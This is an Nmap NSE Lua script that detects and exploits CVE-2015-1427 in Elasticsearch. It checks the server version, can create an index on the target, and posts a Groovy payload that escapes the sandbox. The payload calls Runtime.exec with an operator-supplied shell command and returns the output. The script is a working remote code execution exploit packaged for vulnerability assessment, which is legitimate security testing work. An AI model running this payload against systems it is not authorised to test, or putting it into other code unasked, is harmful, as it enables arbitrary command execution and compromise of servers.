local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local json = require "json"
local base64 = require "base64"
local nmap = require "nmap"

description = [[
A simple script based on the exploit mentioned here :
http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html
The vulnerability allows an attacker to construct Groovy scripts that escape the sandbox and
execute shell commands as the user running the Elasticsearch Java VM
]]

---
-- @args command enter the shell command to be executed
-- tries to fetch the os details by default
-- @args invasive if set to true then creates an index incase one is not present.
-- @usage
-- nmap --script=http-vuln-cve2015-1427 --script-args command='ls' <targets>
--
--@output
-- | http-vuln-cve2015-1427:
-- |   VULNERABLE:
-- |   ElasticSearch CVE-2015-1427 RCE Exploit
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2015-1427
-- |     Risk factor: High CVSS2: 7.5
-- |     Description:
-- |       The vulnerability allows an attacker to construct Groovy scripts that escape the sandbox and execute
-- |           shell commands as the user running the Elasticsearch Java VM.
-- |     Exploit results:
-- |       bin
-- |   config
-- |   data
-- |   lib
-- |   LICENSE.txt
-- |   logs
-- |   NOTICE.txt
-- |   README.textile
-- |
-- |     References:
-- |       https://github.com/elastic/elasticsearch/issues/9655
-- |       https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1427
-- |_      http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html
-- ISSUE : if index not present you need to rerun the script :/
--created 13/3/15

author = {"Gyanendra Mishra", "Daniel Miller"}

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"vuln", "intrusive"}

portrule = shortport.port_or_service(9200, "http", "tcp")


local function parseResult(parsed)
  -- for commands that return printable results : -
  if parsed.hits.hits[1] and parsed.hits.hits[1].fields and parsed.hits.hits[1].fields.exploit[1] then
    return parsed.hits.hits[1].fields.exploit[1]
  end
  -- mkdir(etc) command seems to work but as it returns no result
  if parsed.hits.total > 0 then
    return "Likely vulnerable. Command entered gave no output to print. Use without command argument to ensure vulnerability."
  end
  return false
end

action = function(host, port)

  local command = stdnse.get_script_args(SCRIPT_NAME .. ".command")
  local invasive = stdnse.get_script_args(SCRIPT_NAME .. ".invasive")

  local payload = {
    size= 1,
    query= {
      match_all= {}
    },
    script_fields= {
      exploit= {
        lang= "groovy",
        -- This proves vulnerability because the fix was to prevent access to
        -- .class and .forName
        script= '"ElasticSearch version: "+\z
        java.lang.Math.class.forName("org.elasticsearch.Version").CURRENT+\z
        "\\n    Java version: "+\z
        java.lang.Math.class.forName("java.lang.System").getProperty("java.version")'
      }
    }
  }
  if command then
    payload.script_fields.exploit.script = string.format(
      'java.lang.Math.class.forName("java.util.Scanner").getConstructor(\z
      java.lang.Math.class.forName("java.io.InputStream")).newInstance(\z
      java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec(\z
      %s).getInputStream()).useDelimiter("highlyunusualstring").next()',
      json.generate(command))
  end

  local json_payload = json.generate(payload)

  local vuln_table = {
    title = "ElasticSearch CVE-2015-1427 RCE Exploit",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    references = {
      'http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html',
      'https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/',
      'https://github.com/elastic/elasticsearch/issues/9655'
    },
    IDS = {
      CVE = 'CVE-2015-1427'
    },
    scores = {
      CVSS2 =  '7.5'
    },
    description = [[The vulnerability allows an attacker to construct Groovy
    scripts that escape the sandbox and execute shell commands as the user
    running the Elasticsearch Java VM.]]
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  local cleanup = function() return end
  local nocache = {no_cache=true, bypass_cache=true}
  --lets check the elastic search version.
  local response = http.get(host,port,'/',nocache)
  if response.status == 200 and response.body then
    local status,parsed = json.parse(response.body)
    if not(status) then
      stdnse.print_debug(1,'Parsing JSON failed(version checking). Probably not running Elasticsearch')
      return nil
    else  
      if parsed.version.number then
          --check if a vulnerable version is running
          if (tostring(parsed.version.number):find('1.3.[0-7]') or tostring(parsed.version.number):find('1.4.[0-2]')) then
            vuln_table.state = vulns.STATE.LIKELY_VULN
          end  
          --help the version/service detection.
          port.version = {
            name = 'elasticsearch',
            name_confidence = 10,
            product = 'Elastic elasticsearch',
            version = tostring(parsed.version.number),
            service_tunnel = 'none',
            cpe = {'cpe:/a:elasticsearch:elasticsearch:' .. tostring(parsed.version.number)}
          }
          nmap.set_port_version(host,port,'hardmatched')
      else
        stdnse.print_debug('Cant Be Elastic search as no version number present.')
        return nil      
      end
    end
  else
    stdnse.print_debug('Not Running Elastic Search.')
    return nil  
  end           

  -- check if it is indexed, if not create index
  response = http.get(host,port,'_cat/indices', nocache)
  if response.status ~= 200 then
    stdnse.print_debug(1, "Couldnt fetch indices.")
    return report:make_output(vuln_table)
  elseif response.body == '' then
    if invasive then
      local rand = string.lower(stdnse.generate_random_string(8))
      cleanup = function()
        local r = http.generic_request(host, port, "DELETE", ("/%s"):format(rand))
        if response.status ~= 200 or not ("acknowledged.*true"):match(response.body) then
          stdnse.print_debug(1, "Could not delete index created by invasive script-arg")
        end
      end
      local data = { [rand] = rand }
      response = http.put(host,port,('%s/%s/1'):format(rand, rand),nil,json.generate(data))
      if not(response.status == 201) then
        stdnse.print_debug(1, "Didnt have any index. Creating index failed.")
        return report:make_output(vuln_table)
      end
      stdnse.sleep(5) -- search will not return results immediately
    else
      stdnse.print_debug(1,"Not Indexed. Try the invasive option ;)")
      return report:make_output(vuln_table)
    end
  end

  --execute the command

  local target = '_search'
  response = http.post(host,port,target,nil,nil,(json_payload))

  if not(response.body) or not(response.status==200) then
    cleanup()
    return report:make_output(vuln_table)
  else
    local status,parsed = json.parse(response.body)
    if ( not(status) ) then
      stdnse.print_debug(1,"JSON not parsable.")
      cleanup()
      return report:make_output(vuln_table)
    end
    --if the parseResult function returns something then lets go ahead..
    local results = parseResult(parsed)
    if results then
      vuln_table.state = vulns.STATE.EXPLOIT
      vuln_table.exploit_results = results
    end
  end

  cleanup()
  return report:make_output(vuln_table)
end